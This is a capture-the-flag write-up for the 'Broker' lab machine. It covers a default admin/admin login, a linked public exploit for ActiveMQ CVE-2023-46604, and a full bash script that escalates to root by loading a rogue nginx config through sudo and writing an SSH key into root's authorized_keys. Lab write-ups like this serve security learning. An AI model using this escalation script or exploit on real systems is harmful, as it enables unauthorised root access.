+++
title = 'Broker'
description = 'Easy Linux'
writeup = true
hideMeta = true
+++

nmap scan
![Broker (Easy Linux)-2.png](Broker%20%28Easy%20Linux%29-2.png)
Port 80 open - http
![Broker (Easy Linux)-1.png](Broker%20%28Easy%20Linux%29-1.png)
Going to it shows a basic auth endpoint, and simply using "admin", "admin" we are able to log in.

![Broker (Easy Linux).png](Broker%20%28Easy%20Linux%29.png)

reveals version
![Broker (Easy Linux)-3.png](Broker%20%28Easy%20Linux%29-3.png)

Seems to be an exploit?
![Broker (Easy Linux)-4.png](Broker%20%28Easy%20Linux%29-4.png)

The CVE seems to be specifically related to the OpenWire protocol.
Port 61616 does have ActiveMQ OpenWire transport 5.15.15 running so it seems that this exploit should work.

This seems to be a good public exploit written in Go:
https://github.com/rootsecdev/CVE-2023-46604

Clone the repo, install go and follow instructions
![Broker (Easy Linux)-5.png](Broker%20%28Easy%20Linux%29-5.png)

![Broker (Easy Linux)-6.png](Broker%20%28Easy%20Linux%29-6.png)
We see that we can run a binary as sudo
![Broker (Easy Linux)-7.png](Broker%20%28Easy%20Linux%29-7.png)

Searching up the binary and "lpe sudo"

https://gist.github.com/DylanGrl/ab497e2f01c7d672a80ab9561a903406

Following the instructions, we are able to add an ssh key and use that to ssh as root user

```bash
echo "[+] Creating configuration..."
cat << EOF > /tmp/nginx_pwn.conf
user root;
worker_processes 4;
pid /tmp/nginx.pid;
events {
        worker_connections 768;
}
http {
	server {
	        listen 1339;
	        root /;
	        autoindex on;
	        dav_methods PUT;
	}
}
EOF
echo "[+] Loading configuration..."
sudo nginx -c /tmp/nginx_pwn.conf
echo "[+] Generating SSH Key..."
ssh-keygen
echo "[+] Display SSH Private Key for copy..."
cat .ssh/id_rsa
echo "[+] Add key to root user..."
curl -X PUT localhost:1339/root/.ssh/authorized_keys -d "$(cat .ssh/id_rsa.pub)"
echo "[+] Use the SSH key to get access"
```

![Broker (Easy Linux)-8.png](Broker%20%28Easy%20Linux%29-8.png)

